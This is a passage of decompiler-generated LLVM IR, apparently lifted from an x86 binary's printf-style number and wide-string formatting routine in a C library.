  %v9_80528de = icmp slt i32 %v1_80528de, 0
  store i1 %v9_80528de, i1* %sf.global-to-local, align 1
  store i32 %v1_80528de, i32* %ecx.global-to-local, align 4
  %v0_80528df = load i32, i32* @esp, align 4
  %v1_80528df = add i32 %v0_80528df, 344
  %v2_80528df = inttoptr i32 %v1_80528df to i32*
  %v3_80528df = load i32, i32* %v2_80528df, align 4
  store i32 %v3_80528df, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_80528f7.pre = load i32, i32* @edi, align 4
  br i1 %v8_80528de, label %dec_label_pc_80528f7, label %dec_label_pc_80528ed

dec_label_pc_80528ed:                             ; preds = %dec_label_pc_80528de
  %v2_80528ed = mul i32 %v0_80528f7.pre, 4
  %v3_80528ed = add i32 %v0_80528df, 52
  %v4_80528ed = add i32 %v3_80528ed, %v2_80528ed
  %v5_80528ed = inttoptr i32 %v4_80528ed to i32*
  %v6_80528ed = load i32, i32* %v5_80528ed, align 4
  %v1_80528f1 = and i32 %v6_80528ed, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_80528f1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80528f7

dec_label_pc_80528f7:                             ; preds = %dec_label_pc_80528de, %dec_label_pc_80528ed
  %v2_80528f7 = add i32 %v0_80528df, -4
  %v3_80528f7 = inttoptr i32 %v2_80528f7 to i32*
  store i32 %v0_80528f7.pre, i32* %v3_80528f7, align 4
  %v0_80528f8 = load i32, i32* @esi, align 4
  %v2_80528f8 = add i32 %v0_80528df, -8
  %v3_80528f8 = inttoptr i32 %v2_80528f8 to i32*
  store i32 %v0_80528f8, i32* %v3_80528f8, align 4
  %v0_80528f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80528f9 = add i32 %v0_80528df, -12
  %v3_80528f9 = inttoptr i32 %v2_80528f9 to i32*
  store i32 %v0_80528f9, i32* %v3_80528f9, align 4
  %v0_80528fa = load i32, i32* %edx.global-to-local, align 4
  %v2_80528fa = add i32 %v0_80528df, -16
  %v3_80528fa = inttoptr i32 %v2_80528fa to i32*
  store i32 %v0_80528fa, i32* %v3_80528fa, align 4
  %v0_80528fb = call i32 @_load_inttype()
  %v0_8052900 = load i32, i32* @ebx, align 4
  %v1_8052900 = load i32, i32* @esp, align 4
  %v2_8052900 = inttoptr i32 %v1_8052900 to i32*
  store i32 %v0_8052900, i32* %v2_8052900, align 4
  %v0_8052903 = load i32, i32* @esi, align 4
  %v1_8052903 = load i32, i32* @esp, align 4
  %v2_8052903 = add i32 %v1_8052903, -4
  %v3_8052903 = inttoptr i32 %v2_8052903 to i32*
  store i32 %v0_8052903, i32* %v3_8052903, align 4
  %v0_8052904 = load i32, i32* @edx, align 4
  %v2_8052904 = add i32 %v1_8052903, -8
  %v3_8052904 = inttoptr i32 %v2_8052904 to i32*
  store i32 %v0_8052904, i32* %v3_8052904, align 4
  %v2_8052905 = add i32 %v1_8052903, -12
  %v3_8052905 = inttoptr i32 %v2_8052905 to i32*
  store i32 %v0_80528fb, i32* %v3_8052905, align 4
  %v1_8052906 = add i32 %v1_8052903, 347
  store i32 %v1_8052906, i32* %eax.global-to-local, align 4
  %v2_805290d = add i32 %v1_8052903, -16
  %v3_805290d = inttoptr i32 %v2_805290d to i32*
  store i32 %v1_8052906, i32* %v3_805290d, align 4
  %v0_805290e = load i32, i32* %stack_var_-364, align 4
  %v5_805290e = inttoptr i32 %v0_805290e to i8*
  %v6_805290e = call i32 @_uintmaxtostr(i8* %v5_805290e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_805290e, i32* %eax.global-to-local, align 4
  %v0_8052913 = load i32, i32* @esp, align 4
  %v1_8052913 = add i32 %v0_8052913, 32
  %v1_8052916 = add i32 %v0_8052913, 80
  %v2_8052916 = inttoptr i32 %v1_8052916 to i32*
  %v3_8052916 = load i32, i32* %v2_8052916, align 4
  %v4_8052916 = add i32 %v3_8052916, -5
  %v8_8052916 = icmp ult i32 %v3_8052916, 5
  %v12_8052916 = icmp eq i32 %v4_8052916, 0
  %v13_8052916 = icmp slt i32 %v4_8052916, 0
  store i1 %v13_8052916, i1* %sf.global-to-local, align 1
  store i32 %v6_805290e, i32* @edi, align 4
  %v2_805291d = or i1 %v8_8052916, %v12_8052916
  br i1 %v2_805291d, label %dec_label_pc_8052947, label %dec_label_pc_805291f

dec_label_pc_805291f:                             ; preds = %dec_label_pc_80528f7
  %v7_805290e = inttoptr i32 %v6_805290e to i8*
  %v3_805291f = load i8, i8* %v7_805290e, align 1
  %v4_805291f = add i8 %v3_805291f, -45
  %v12_805291f = icmp eq i8 %v4_805291f, 0
  %v13_805291f = icmp slt i8 %v4_805291f, 0
  store i1 %v13_805291f, i1* %sf.global-to-local, align 1
  %v1_8052922 = icmp eq i1 %v12_805291f, false
  %v1_8052931 = add i32 %v0_8052913, 64
  %v2_8052931 = inttoptr i32 %v1_8052931 to i32*
  %v3_8052931 = load i32, i32* %v2_8052931, align 4
  br i1 %v1_8052922, label %dec_label_pc_8052931, label %dec_label_pc_8052924

dec_label_pc_8052924:                             ; preds = %dec_label_pc_805291f
  %v4_8052924 = or i32 %v3_8052931, 2
  store i32 %v4_8052924, i32* %v2_8052931, align 4
  %v0_8052929 = load i32, i32* @edi, align 4
  %v1_8052929 = add i32 %v0_8052929, 1
  %v9_8052929 = icmp slt i32 %v1_8052929, 0
  store i1 %v9_8052929, i1* %sf.global-to-local, align 1
  store i32 %v1_8052929, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_8052947.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052947

dec_label_pc_8052931:                             ; preds = %dec_label_pc_805291f
  store i32 %v3_8052931, i32* %eax.global-to-local, align 4
  %v2_8052935 = and i32 %v3_8052931, 2
  %v3_8052935 = icmp eq i32 %v2_8052935, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_8052935, label %dec_label_pc_805293d, label %dec_label_pc_8052939

dec_label_pc_8052939:                             ; preds = %dec_label_pc_8052931
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8052947

dec_label_pc_805293d:                             ; preds = %dec_label_pc_8052931
  %v2_805293d = urem i32 %v3_8052931, 2
  %v3_805293d = icmp eq i32 %v2_805293d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_8052944 = icmp eq i1 %v3_805293d, false
  %v2_8052944 = load i32, i32* @ebp, align 4
  %v4_8052944 = select i1 %v1_8052944, i32 4, i32 %v2_8052944
  store i32 %v4_8052944, i32* @ebp, align 4
  br label %dec_label_pc_8052947

dec_label_pc_8052947:                             ; preds = %dec_label_pc_80528f7, %dec_label_pc_8052939, %dec_label_pc_8052924, %dec_label_pc_805293d
  %v0_8052999 = phi i32 [ %v6_805290e, %dec_label_pc_80528f7 ], [ %v6_805290e, %dec_label_pc_8052939 ], [ %v1_8052929, %dec_label_pc_8052924 ], [ %v6_805290e, %dec_label_pc_805293d ]
  %v0_80529a9 = phi i32 [ %v1_8052913, %dec_label_pc_80528f7 ], [ %v1_8052913, %dec_label_pc_8052939 ], [ %v0_8052947.pre, %dec_label_pc_8052924 ], [ %v1_8052913, %dec_label_pc_805293d ]
  %v1_8052947 = add i32 %v0_80529a9, 20
  %v2_8052947 = inttoptr i32 %v1_8052947 to i32*
  %v3_8052947 = load i32, i32* %v2_8052947, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_805294b = sub i32 204, %v0_8052999
  %v2_8052957 = add i32 %v1_805294b, %v0_80529a9
  %v1_8052959 = add i32 %v2_8052957, 127
  store i32 %v1_8052959, i32* @esi, align 4
  %v2_805295c = icmp slt i32 %v3_8052947, 0
  store i1 %v2_805295c, i1* %sf.global-to-local, align 1
  %v3_805295e = select i1 %v2_805295c, i32 1, i32 %v3_8052947
  store i32 %v3_805295e, i32* %ecx.global-to-local, align 4
  %v1_8052961 = add i32 %v0_80529a9, 32
  %v2_8052961 = inttoptr i32 %v1_8052961 to i8*
  %v3_8052961 = load i8, i8* %v2_8052961, align 1
  %v4_8052961 = and i8 %v3_8052961, 16
  %v5_8052961 = icmp eq i8 %v4_8052961, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_8052961, label %dec_label_pc_8052999, label %dec_label_pc_8052968

dec_label_pc_8052968:                             ; preds = %dec_label_pc_8052947
  %v1_8052968 = add i32 %v0_80529a9, 48
  %v2_8052968 = inttoptr i32 %v1_8052968 to i32*
  %v3_8052968 = load i32, i32* %v2_8052968, align 4
  store i32 %v3_8052968, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp71 = icmp ult i32 %v3_8052968, 3
  %v3_8052971 = load i32, i32* @ebp, align 4
  %v5_8052971 = select i1 %tmp71, i32 6, i32 %v3_8052971
  store i32 %v5_8052971, i32* @ebp, align 4
  %v1_8052974 = add i32 %v3_8052968, -3
  %v9_8052974 = icmp eq i32 %v1_8052974, 0
  %v10_8052974 = icmp slt i32 %v1_8052974, 0
  store i1 %v10_8052974, i1* %sf.global-to-local, align 1
  %v1_8052977 = icmp eq i1 %v9_8052974, false
  br i1 %v1_8052977, label %dec_label_pc_8052980, label %dec_label_pc_8052979

dec_label_pc_8052979:                             ; preds = %dec_label_pc_8052968
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_8052999

dec_label_pc_8052980:                             ; preds = %dec_label_pc_8052968
  %v1_8052980 = add i32 %v3_8052968, -4
  %v9_8052980 = icmp eq i32 %v1_8052980, 0
  %v10_8052980 = icmp slt i32 %v1_8052980, 0
  store i1 %v10_8052980, i1* %sf.global-to-local, align 1
  %v1_8052983 = icmp eq i1 %v9_8052980, false
  br i1 %v1_8052983, label %dec_label_pc_8052999, label %dec_label_pc_8052985

dec_label_pc_8052985:                             ; preds = %dec_label_pc_8052980
  %v2_8052985 = sub i32 %v3_805295e, %v1_8052959
  %v7_8052985 = icmp ult i32 %v3_805295e, %v1_8052959
  %v12_8052985 = icmp eq i32 %v2_8052985, 0
  %v13_8052985 = icmp slt i32 %v2_8052985, 0
  store i1 %v13_8052985, i1* %sf.global-to-local, align 1
  %v2_8052987 = or i1 %v7_8052985, %v12_8052985
  br i1 %v2_8052987, label %dec_label_pc_8052989, label %dec_label_pc_8052999

dec_label_pc_8052989:                             ; preds = %dec_label_pc_8052985
  %v1_8052989 = inttoptr i32 %v0_8052999 to i8*
  %v2_8052989 = load i8, i8* %v1_8052989, align 1
  %v3_8052989 = add i8 %v2_8052989, -48
  %v8_8052989 = icmp eq i8 %v3_8052989, 0
  %v9_8052989 = icmp slt i8 %v3_8052989, 0
  store i1 %v9_8052989, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_8052989, label %dec_label_pc_8052999, label %dec_label_pc_8052993

dec_label_pc_8052993:                             ; preds = %dec_label_pc_8052989
  %v1_8052993 = add i32 %v2_8052957, 128
  store i32 %v1_8052993, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052999

dec_label_pc_8052999:                             ; preds = %dec_label_pc_8052985, %dec_label_pc_8052989, %dec_label_pc_8052980, %dec_label_pc_8052947, %dec_label_pc_8052979, %dec_label_pc_8052993
  %v0_80529d2 = phi i32 [ %v3_805295e, %dec_label_pc_8052985 ], [ 1, %dec_label_pc_8052989 ], [ %v3_805295e, %dec_label_pc_8052980 ], [ %v3_805295e, %dec_label_pc_8052947 ], [ %v3_805295e, %dec_label_pc_8052979 ], [ %v1_8052993, %dec_label_pc_8052993 ]
  %v1_8052999 = inttoptr i32 %v0_8052999 to i8*
  %v2_8052999 = load i8, i8* %v1_8052999, align 1
  %v3_8052999 = add i8 %v2_8052999, -48
  %v8_8052999 = icmp eq i8 %v3_8052999, 0
  %v9_8052999 = icmp slt i8 %v3_8052999, 0
  store i1 %v9_8052999, i1* %sf.global-to-local, align 1
  %v1_805299c = icmp eq i1 %v8_8052999, false
  br i1 %v1_805299c, label %dec_label_pc_80529ca, label %dec_label_pc_805299e

dec_label_pc_805299e:                             ; preds = %dec_label_pc_8052999
  %v0_805299e = load i32, i32* @ebp, align 4
  %v1_805299e = add i32 %v0_805299e, -6
  %v6_805299e = sub i32 5, %v0_805299e
  %v7_805299e = and i32 %v6_805299e, %v0_805299e
  %v8_805299e = icmp slt i32 %v7_805299e, 0
  %v10_805299e = icmp slt i32 %v1_805299e, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_80529a6 = icmp eq i1 %v10_805299e, %v8_805299e
  %v5_80529a6 = select i1 %v2_80529a6, i32 11, i32 %v0_805299e
  store i32 %v5_80529a6, i32* @ebp, align 4
  %v1_80529a9 = add i32 %v0_80529a9, 48
  %v2_80529a9 = inttoptr i32 %v1_80529a9 to i32*
  %v3_80529a9 = load i32, i32* %v2_80529a9, align 4
  %v4_80529a9 = add i32 %v3_80529a9, -1
  %v12_80529a9 = icmp eq i32 %v4_80529a9, 0
  %v13_80529a9 = icmp slt i32 %v4_80529a9, 0
  store i1 %v13_80529a9, i1* %sf.global-to-local, align 1
  %v1_80529ae = icmp eq i1 %v12_80529a9, false
  br i1 %v1_80529ae, label %dec_label_pc_80529bf, label %dec_label_pc_80529b0

dec_label_pc_80529b0:                             ; preds = %dec_label_pc_805299e
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805db18.925 to i32), i32* @edi, align 4
  br label %dec_label_pc_8052b49

dec_label_pc_80529bf:                             ; preds = %dec_label_pc_805299e
  %v1_80529bf = icmp eq i32 %v0_80529d2, 0
  %v2_80529bf = icmp slt i32 %v0_80529d2, 0
  store i1 %v2_80529bf, i1* %sf.global-to-local, align 1
  %v1_80529c1 = icmp eq i1 %v1_80529bf, false
  br i1 %v1_80529c1, label %dec_label_pc_80529ca, label %dec_label_pc_80529c3

dec_label_pc_80529c3:                             ; preds = %dec_label_pc_80529bf
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052b49

dec_label_pc_80529ca:                             ; preds = %dec_label_pc_80529bf, %dec_label_pc_8052999
  %v2_80529ca = sub i32 %v0_80529d2, %v1_8052959
  %v7_80529ca = icmp ult i32 %v0_80529d2, %v1_8052959
  %v12_80529ca = icmp eq i32 %v2_80529ca, 0
  %v13_80529ca = icmp slt i32 %v2_80529ca, 0
  store i1 %v13_80529ca, i1* %sf.global-to-local, align 1
  %v2_80529cc = or i1 %v7_80529ca, %v12_80529ca
  br i1 %v2_80529cc, label %dec_label_pc_8052b49, label %dec_label_pc_80529d2

dec_label_pc_80529d2:                             ; preds = %dec_label_pc_80529ca
  store i1 %v13_80529ca, i1* %sf.global-to-local, align 1
  store i32 %v2_80529ca, i32* @ebx, align 4
  br label %dec_label_pc_8052b63

dec_label_pc_80529db:                             ; preds = %dec_label_pc_805286e
  %v1_80529db = add i32 %v3_8052840, -15
  %v5_80529db = icmp ult i32 %v3_8052840, 15
  %v9_80529db = icmp eq i32 %v1_80529db, 0
  %v10_80529db = icmp slt i32 %v1_80529db, 0
  store i1 %v10_80529db, i1* %sf.global-to-local, align 1
  %v2_80529de = or i1 %v5_80529db, %v9_80529db
  br i1 %v2_80529de, label %dec_label_pc_80529e0, label %dec_label_pc_8052a25

dec_label_pc_80529e0:                             ; preds = %dec_label_pc_80529db
  %v1_80529e0 = add i32 %v0_8052840.lcssa, 33
  %v2_80529e0 = inttoptr i32 %v1_80529e0 to i8*
  %v3_80529e0 = load i8, i8* %v2_80529e0, align 1
  %v4_80529e0 = and i8 %v3_80529e0, 8
  %v5_80529e0 = icmp eq i8 %v4_80529e0, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_80529e5 = add i32 %v0_8052840.lcssa, 344
  %v2_80529e5 = inttoptr i32 %v1_80529e5 to i32*
  %v3_80529e5 = load i32, i32* %v2_80529e5, align 4
  store i32 %v3_80529e5, i32* %edx.global-to-local, align 4
  br i1 %v5_80529e0, label %dec_label_pc_80529f2, label %dec_label_pc_80529ee

dec_label_pc_80529ee:                             ; preds = %dec_label_pc_80529e0
  %v1_80529ee = inttoptr i32 %v3_80529e5 to x86_fp80*
  %v2_80529ee = load x86_fp80, x86_fp80* %v1_80529ee, align 4
  br label %dec_label_pc_80529f4

dec_label_pc_80529f2:                             ; preds = %dec_label_pc_80529e0
  %v1_80529f2 = inttoptr i32 %v3_80529e5 to double*
  %v2_80529f2 = load double, double* %v1_80529f2, align 4
  %v3_80529f2 = fpext double %v2_80529f2 to x86_fp80
  br label %dec_label_pc_80529f4

dec_label_pc_80529f4:                             ; preds = %dec_label_pc_80529ee, %dec_label_pc_80529f2
  %storemerge6 = phi x86_fp80 [ %v2_80529ee, %dec_label_pc_80529ee ], [ %v3_80529f2, %dec_label_pc_80529f2 ]
  store x86_fp80 %storemerge6, x86_fp80* %st0.global-to-local, align 4
  %v0_80529f4 = load i32, i32* @esi, align 4
  %v2_80529f4 = add i32 %v0_8052840.lcssa, -4
  %v3_80529f4 = inttoptr i32 %v2_80529f4 to i32*
  store i32 %v0_80529f4, i32* %v3_80529f4, align 4
  %v0_80529f5 = load i32, i32* @esi, align 4
  %v2_80529f5 = add i32 %v0_8052840.lcssa, -8
  %v3_80529f5 = inttoptr i32 %v2_80529f5 to i32*
  store i32 %v0_80529f5, i32* %v3_80529f5, align 4
  %v1_80529f6 = add i32 %v0_8052840.lcssa, -12
  %v2_80529f6 = inttoptr i32 %v1_80529f6 to i32*
  store i32 134555318, i32* %v2_80529f6, align 4
  %v1_80529fb = add i32 %v0_8052840.lcssa, 20
  store i32 %v1_80529fb, i32* %eax.global-to-local, align 4
  %v2_80529ff = add i32 %v0_8052840.lcssa, -16
  %v3_80529ff = inttoptr i32 %v2_80529ff to i32*
  store i32 %v1_80529fb, i32* %v3_80529ff, align 4
  %v1_8052a00 = add i32 %v0_8052840.lcssa, -28
  %v10_8052a00 = icmp slt i32 %v1_8052a00, 0
  store i1 %v10_8052a00, i1* %sf.global-to-local, align 1
  %v1_8052a03 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8052a03 = inttoptr i32 %v1_8052a00 to x86_fp80*
  store x86_fp80 %v1_8052a03, x86_fp80* %v3_8052a03, align 4
  %v1_8052a06 = add i32 %v0_8052840.lcssa, 368
  %v2_8052a06 = inttoptr i32 %v1_8052a06 to i32*
  %v3_8052a06 = load i32, i32* %v2_8052a06, align 4
  %v5_8052a06 = add i32 %v0_8052840.lcssa, -32
  %v6_8052a06 = inttoptr i32 %v5_8052a06 to i32*
  store i32 %v3_8052a06, i32* %v6_8052a06, align 4
  %v0_8052a0d = call i32 @_fpmaxtostr()
  store i32 %v0_8052a0d, i32* %eax.global-to-local, align 4
  %v0_8052a12 = load i32, i32* @esp, align 4
  %v1_8052a12 = add i32 %v0_8052a12, 32
  %v2_8052a15 = icmp slt i32 %v0_8052a0d, 0
  store i1 %v2_8052a15, i1* %sf.global-to-local, align 1
  br i1 %v2_8052a15, label %dec_label_pc_8052cc3, label %dec_label_pc_8052a1d

dec_label_pc_8052a1d:                             ; preds = %dec_label_pc_80529f4
  %v1_8052a1d = inttoptr i32 %v1_8052a12 to i32*
  %v2_8052a1d = load i32, i32* %v1_8052a1d, align 4
  %v4_8052a1d = add i32 %v2_8052a1d, %v0_8052a0d
  %v15_8052a1d = icmp slt i32 %v4_8052a1d, 0
  store i1 %v15_8052a1d, i1* %sf.global-to-local, align 1
  store i32 %v4_8052a1d, i32* %v1_8052a1d, align 4
  %v0_8052cb0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052cb0

dec_label_pc_8052a25:                             ; preds = %dec_label_pc_80529db
  %v1_8052a25 = add i32 %v3_8052840, -17
  %v5_8052a25 = icmp ult i32 %v3_8052840, 17
  %v9_8052a25 = icmp eq i32 %v1_8052a25, 0
  %v10_8052a25 = icmp slt i32 %v1_8052a25, 0
  store i1 %v10_8052a25, i1* %sf.global-to-local, align 1
  %v2_8052a28 = or i1 %v5_8052a25, %v9_8052a25
  br i1 %v2_8052a28, label %dec_label_pc_8052a2e, label %dec_label_pc_8052ac2

dec_label_pc_8052a2e:                             ; preds = %dec_label_pc_8052a25
  %v1_8052a2e = add i32 %v0_8052840.lcssa, 332
  %v2_8052a2e = inttoptr i32 %v1_8052a2e to i32*
  store i32 0, i32* %v2_8052a2e, align 4
  %v0_8052a39 = load i32, i32* @esp, align 4
  %v1_8052a39 = add i32 %v0_8052a39, 344
  %v2_8052a39 = inttoptr i32 %v1_8052a39 to i32*
  %v3_8052a39 = load i32, i32* %v2_8052a39, align 4
  store i32 %v3_8052a39, i32* %edx.global-to-local, align 4
  %v1_8052a40 = icmp eq i1 %v9_8052a25, false
  br i1 %v1_8052a40, label %dec_label_pc_8052a92, label %dec_label_pc_8052a42

dec_label_pc_8052a42:                             ; preds = %dec_label_pc_8052a2e
  %v1_8052a42 = inttoptr i32 %v3_8052a39 to i32*
  %v2_8052a42 = load i32, i32* %v1_8052a42, align 4
  store i32 %v2_8052a42, i32* %eax.global-to-local, align 4
  %v1_8052a44 = icmp eq i32 %v2_8052a42, 0
  %v2_8052a44 = icmp slt i32 %v2_8052a42, 0
  store i1 %v2_8052a44, i1* %sf.global-to-local, align 1
  %v2_8052a46 = add i32 %v0_8052a39, 340
  %v3_8052a46 = inttoptr i32 %v2_8052a46 to i32*
  store i32 %v2_8052a42, i32* %v3_8052a46, align 4
  br i1 %v1_8052a44, label %dec_label_pc_8052b4d, label %dec_label_pc_8052a53

dec_label_pc_8052a53:                             ; preds = %dec_label_pc_8052a42
  %v0_8052a53 = load i32, i32* @esp, align 4
  %v1_8052a53 = add i32 %v0_8052a53, 20
  %v2_8052a53 = inttoptr i32 %v1_8052a53 to i32*
  %v3_8052a53 = load i32, i32* %v2_8052a53, align 4
  %v1_8052a5a = add i32 %v0_8052a53, 340
  store i32 %v1_8052a5a, i32* %ecx.global-to-local, align 4
  %v2_8052a61 = icmp slt i32 %v3_8052a53, 0
  store i1 %v2_8052a61, i1* %sf.global-to-local, align 1
  %v1_8052a63 = icmp eq i1 %v2_8052a61, false
  %v4_8052a63 = select i1 %v1_8052a63, i32 %v3_8052a53, i32 -1
  store i32 %v4_8052a63, i32* %edx.global-to-local, align 4
  %v1_8052a66 = add i32 %v0_8052a53, 332
  store i32 %v1_8052a66, i32* %eax.global-to-local, align 4
  %v2_8052a6d = add i32 %v0_8052a53, -4
  %v3_8052a6d = inttoptr i32 %v2_8052a6d to i32*
  store i32 %v1_8052a66, i32* %v3_8052a6d, align 4
  %v0_8052a6e = load i32, i32* %edx.global-to-local, align 4
  %v2_8052a6e = add i32 %v0_8052a53, -8
  %v3_8052a6e = inttoptr i32 %v2_8052a6e to i32*
  store i32 %v0_8052a6e, i32* %v3_8052a6e, align 4
  %v0_8052a6f = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052a6f = add i32 %v0_8052a53, -12
  %v3_8052a6f = inttoptr i32 %v2_8052a6f to i32*
  store i32 %v0_8052a6f, i32* %v3_8052a6f, align 4
  %v0_8052a70 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052a70 = add i32 %v0_8052a53, -16
  %v3_8052a70 = inttoptr i32 %v2_8052a70 to i32*
  store i32 %v0_8052a70, i32* %v3_8052a70, align 4
  %v0_8052a71 = call i32 @__GI_wcsrtombs()
  store i32 %v0_8052a71, i32* %eax.global-to-local, align 4
  %v0_8052a76 = load i32, i32* @esp, align 4
  %v1_8052a76 = add i32 %v0_8052a76, 16
  %v1_8052a79 = add i32 %v0_8052a71, 1
  %v10_8052a79 = icmp eq i32 %v1_8052a79, 0
  %v11_8052a79 = icmp slt i32 %v1_8052a79, 0
  store i1 %v11_8052a79, i1* %sf.global-to-local, align 1
  store i32 %v0_8052a71, i32* @esi, align 4
  br i1 %v10_8052a79, label %dec_label_pc_8052cc3, label %dec_label_pc_8052a84

dec_label_pc_8052a84:                             ; preds = %dec_label_pc_8052a53
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8052b5e

dec_label_pc_8052a92:                             ; preds = %dec_label_pc_8052a2e
  %v0_8052a92 = load i32, i32* @ebx, align 4
  %v2_8052a92 = add i32 %v0_8052a39, -4
  %v3_8052a92 = inttoptr i32 %v2_8052a92 to i32*
  store i32 %v0_8052a92, i32* %v3_8052a92, align 4
  %v1_8052a93 = add i32 %v0_8052a39, 332
  store i32 %v1_8052a93, i32* %eax.global-to-local, align 4
  %v2_8052a9a = add i32 %v0_8052a39, -8
  %v3_8052a9a = inttoptr i32 %v2_8052a9a to i32*
  store i32 %v1_8052a93, i32* %v3_8052a9a, align 4
  %v0_8052a9b = load i32, i32* %edx.global-to-local, align 4
  %v1_8052a9b = inttoptr i32 %v0_8052a9b to i32*
  %v2_8052a9b = load i32, i32* %v1_8052a9b, align 4
  %v4_8052a9b = add i32 %v0_8052a39, -12
  %v5_8052a9b = inttoptr i32 %v4_8052a9b to i32*
  store i32 %v2_8052a9b, i32* %v5_8052a9b, align 4
  %v1_8052a9d = add i32 %v0_8052a39, 204
  store i32 %v1_8052a9d, i32* @edi, align 4
  %v2_8052aa4 = add i32 %v0_8052a39, -16
  %v3_8052aa4 = inttoptr i32 %v2_8052aa4 to i32*
  store i32 %v1_8052a9d, i32* %v3_8052aa4, align 4
  %v0_8052aa5 = call i32 @__GI_wcrtomb()
  store i32 %v0_8052aa5, i32* %eax.global-to-local, align 4
  %v0_8052aaa = load i32, i32* @esp, align 4
  %v1_8052aaa = add i32 %v0_8052aaa, 16
  %v1_8052aad = add i32 %v0_8052aa5, 1
  %v10_8052aad = icmp eq i32 %v1_8052aad, 0
  %v11_8052aad = icmp slt i32 %v1_8052aad, 0
  store i1 %v11_8052aad, i1* %sf.global-to-local, align 1
  store i32 %v0_8052aa5, i32* @esi, align 4
  br i1 %v10_8052aad, label %dec_label_pc_8052cc3, label %dec_label_pc_8052ab8

dec_label_pc_8052ab8:                             ; preds = %dec_label_pc_8052a92
  %v2_8052ab8 = add i32 %v0_8052aa5, 220
  %v3_8052ab8 = add i32 %v2_8052ab8, %v0_8052aaa
  %v4_8052ab8 = inttoptr i32 %v3_8052ab8 to i8*
  store i8 0, i8* %v4_8052ab8, align 1
  br label %dec_label_pc_8052af0

dec_label_pc_8052ac2:                             ; preds = %dec_label_pc_8052a25
  %v1_8052ac2 = add i32 %v3_8052840, -19
  %v5_8052ac2 = icmp ult i32 %v3_8052840, 19
  %v9_8052ac2 = icmp eq i32 %v1_8052ac2, 0
  %v10_8052ac2 = icmp slt i32 %v1_8052ac2, 0
  store i1 %v10_8052ac2, i1* %sf.global-to-local, align 1
  %v2_8052ac5 = or i1 %v5_8052ac2, %v9_8052ac2
  br i1 %v2_8052ac5, label %dec_label_pc_8052ac7, label %dec_label_pc_8052b1f

dec_label_pc_8052ac7:                             ; preds = %dec_label_pc_8052ac2
  %v1_8052ac7 = add i32 %v0_8052840.lcssa, 344
  %v2_8052ac7 = inttoptr i32 %v1_8052ac7 to i32*
  %v3_8052ac7 = load i32, i32* %v2_8052ac7, align 4
  store i32 %v3_8052ac7, i32* %edx.global-to-local, align 4
  %v1_8052ace = icmp eq i1 %v9_8052ac2, false
  %v1_8052af9 = inttoptr i32 %v3_8052ac7 to i32*
  %v2_8052af9 = load i32, i32* %v1_8052af9, align 4
  br i1 %v1_8052ace, label %dec_label_pc_8052af9, label %dec_label_pc_8052ad0

dec_label_pc_8052ad0:                             ; preds = %dec_label_pc_8052ac7
  store i32 %v2_8052af9, i32* @edi, align 4
  %v1_8052ad2 = icmp eq i32 %v2_8052af9, 0
  %v2_8052ad2 = icmp slt i32 %v2_8052af9, 0
  store i1 %v2_8052ad2, i1* %sf.global-to-local, align 1
  br i1 %v1_8052ad2, label %dec_label_pc_8052b4d, label %dec_label_pc_8052ad6

dec_label_pc_8052ad6:                             ; preds = %dec_label_pc_8052ad0, %dec_label_pc_8052b28
  %v1_8052add = phi i32 [ %v0_8052840.lcssa, %dec_label_pc_8052ad0 ], [ %v1_8052b42, %dec_label_pc_8052b28 ]
  %v1_8052ad6 = add i32 %v1_8052add, 20
  %v2_8052ad6 = inttoptr i32 %v1_8052ad6 to i32*
  %v3_8052ad6 = load i32, i32* %v2_8052ad6, align 4
  store i32 %v3_8052ad6, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_8052add = add i32 %v1_8052add, -4
  %v3_8052add = inttoptr i32 %v2_8052add to i32*
  store i32 %v3_8052840, i32* %v3_8052add, align 4
  %v2_8052ade = add i32 %v1_8052add, -8
  %v3_8052ade = inttoptr i32 %v2_8052ade to i32*
  store i32 %v3_8052840, i32* %v3_8052ade, align 4
  %v2_8052adf = icmp slt i32 %v3_8052ad6, 0
  store i1 %v2_8052adf, i1* %sf.global-to-local, align 1
  %v1_8052ae1 = icmp eq i1 %v2_8052adf, false
  %v2_8052ae1 = load i32, i32* %eax.global-to-local, align 4
  %v4_8052ae1 = select i1 %v1_8052ae1, i32 %v3_8052ad6, i32 %v2_8052ae1
  store i32 %v4_8052ae1, i32* %eax.global-to-local, align 4
  %v2_8052ae4 = add i32 %v1_8052add, -12
  %v3_8052ae4 = inttoptr i32 %v2_8052ae4 to i32*
  store i32 %v4_8052ae1, i32* %v3_8052ae4, align 4
  %v0_8052ae5 = load i32, i32* @edi, align 4
  %v2_8052ae5 = add i32 %v1_8052add, -16
